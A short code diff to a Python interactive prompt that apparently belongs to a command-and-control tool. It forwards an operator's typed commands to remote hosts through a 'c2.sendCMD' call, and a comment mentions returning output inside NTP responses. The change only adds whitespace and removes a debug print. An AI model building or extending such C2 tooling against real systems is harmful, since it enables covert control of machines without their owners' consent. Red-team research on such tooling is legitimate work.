@@ -197,15 +197,18 @@ def cmdPrompt(interactType, id, TS):
                           "help ~ display this list of commands.\n "
                           "back ~ return to the interact prompt.\n",
                           'yellow'))
+
         elif user_input == "back" or user_input == "exit":
             return
+
         elif user_input == "":
             pass #do nothing
+
         elif user_input == "clear":
             system('clear')
+            
         else:
             #TODO sending quotes (and other chars) is being weird, fix this
-            print(user_input)
             c2.sendCMD(TS, user_input, interactType, id) #TODO what about running exes/commands that hang?
             
             #C: get output and encode in NTP response
